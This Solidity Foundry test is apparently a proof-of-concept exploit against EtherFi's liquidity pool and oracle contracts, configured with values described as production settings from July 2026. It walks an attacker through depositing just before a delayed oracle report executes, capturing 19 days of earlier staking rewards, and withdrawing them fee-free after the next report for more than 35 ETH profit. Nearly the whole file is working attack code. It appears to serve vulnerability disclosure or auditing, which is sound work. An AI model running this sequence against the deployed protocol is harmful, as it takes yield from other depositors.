// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Tested after copying this artifact into test/ on the clean reviewed
// origin/master snapshot. The import is intentionally relative to test/.

import "./TestSetup.sol";

contract OraclePositiveRebaseAsyncExitPoC is TestSetup {
    address internal incumbent = makeAddr("incumbent");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        setUpTests();

        vm.prank(admin);
        withdrawRequestNFTInstance.unpause();

        // Approximate current deployment accounting: ~14.6k ETH liquid and
        // ~1.965m ETH outside the LP, for 1,979,285 ETH total TVL.
        vm.deal(incumbent, 14_559 ether);
        vm.prank(incumbent);
        liquidityPoolInstance.deposit{value: 14_559 ether}();

        vm.prank(address(etherFiAdminInstance));
        liquidityPoolInstance.depositToRecipient(incumbent, 1_964_726 ether, address(0));

        // Production values observed on 31 July 2026.
        vm.startPrank(owner);
        liquidityPoolInstance.setMaxWithdrawAmount(1_000 ether);
        etherFiOracleInstance.setOracleReportPeriod(1_280);
        etherFiAdminInstance.updateMaxFinalizedWithdrawalAmountPerDay(80_000 ether);
        vm.stopPrank();
    }

    function test_delayedReportCaptureExitsFeeFreeAtNextReport() public {
        uint256 tvlBefore = liquidityPoolInstance.getTotalPooledEther();
        assertEq(tvlBefore, 1_979_285 ether);
        assertEq(liquidityPoolInstance.totalValueInLp(), 14_559 ether);

        // A report spanning 19 days can reach the 25-bps hard cap while
        // remaining below the deployed 5% annualized acceptance limit.
        _moveClock(int256(19 days / 12));
        IEtherFiOracle.OracleReport memory stalePositive = _emptyOracleReport();
        stalePositive.accruedRewards = int128(int256(tvlBefore * 25 / 10_000));
        _publishForExecution(stalePositive);
        assertTrue(etherFiAdminInstance.canExecuteTasks(stalePositive));

        // Near the maximum amount that an 80k-ETH/day finalization limit
        // permits in the next 1,280-slot report.
        uint256 capital = 14_187 ether;
        vm.deal(attacker, capital);

        vm.startPrank(attacker);
        liquidityPoolInstance.deposit{value: capital}();
        etherFiAdminInstance.executeTasks(stalePositive);

        uint256 capturedBalance = eETHInstance.balanceOf(attacker);
        uint256 capturedOldRewards = capturedBalance - capital;
        assertGt(capturedOldRewards, 35 ether);

        eETHInstance.approve(address(liquidityPoolInstance), type(uint256).max);
        uint256 requestCount = (capturedBalance + 1_000 ether - 1) / (1_000 ether);
        uint256[] memory requestIds = new uint256[](requestCount);
        uint256 remaining = capturedBalance;
        uint256 totalRequested;

        for (uint256 i; i < requestCount; ++i) {
            uint256 amount = remaining > 1_000 ether ? 1_000 ether : remaining;
            requestIds[i] = liquidityPoolInstance.requestWithdraw(attacker, amount);
            totalRequested += amount;
            remaining -= amount;
        }
        vm.stopPrank();

        assertEq(totalRequested, capturedBalance);
        assertEq(requestCount, 15);

        // The next normal report finalizes all 15 public withdrawal NFTs.
        // Including a normal positive rebase here shows that post-request yield
        // is not needed for the attack and does not increase the capped payout.
        _moveClock(1_280);
        uint256 secondTvl = liquidityPoolInstance.getTotalPooledEther();
        IEtherFiOracle.OracleReport memory nextReport = _emptyOracleReport();
        nextReport.accruedRewards = int128(int256(
            secondTvl * 500 * (1_280 * 12) / (10_000 * 365 days)
        ));
        nextReport.lastFinalizedWithdrawalRequestId = uint32(requestIds[requestCount - 1]);
        nextReport.finalizedWithdrawalAmount = uint128(totalRequested);

        _publishForExecution(nextReport);
        assertTrue(etherFiAdminInstance.canExecuteTasks(nextReport));
        etherFiAdminInstance.executeTasks(nextReport);

        for (uint256 i; i < requestCount; ++i) {
            withdrawRequestNFTInstance.claimWithdraw(requestIds[i]);
        }

        uint256 profit = attacker.balance - capital;
        emit log_named_decimal_uint("attacker profit (ETH)", profit, 18);

        // No instant-exit fee or whitelist. The attacker receives the rewards
        // earned during the 19 days before its deposit after one normal cycle.
        assertGt(profit, 35 ether);
        assertApproxEqAbs(profit, capturedOldRewards, 1e12);
    }

    function _publishForExecution(IEtherFiOracle.OracleReport memory report) internal {
        _initReportBlockStamp(report);

        uint32 currentSlot = etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        uint32 currentEpoch = currentSlot / 32;
        uint32 reportEpoch = report.refSlotTo / 32 + 3;
        if (currentEpoch < reportEpoch) {
            _moveClock(int256(uint256(32 * (reportEpoch - currentEpoch))));
        }

        vm.prank(alice);
        etherFiOracleInstance.submitReport(report);
        vm.prank(bob);
        etherFiOracleInstance.submitReport(report);

        // Ensure the consensused report has passed the deployed 50-slot wait.
        _moveClock(int256(uint256(etherFiAdminInstance.postReportWaitTimeInSlots())));
    }
}
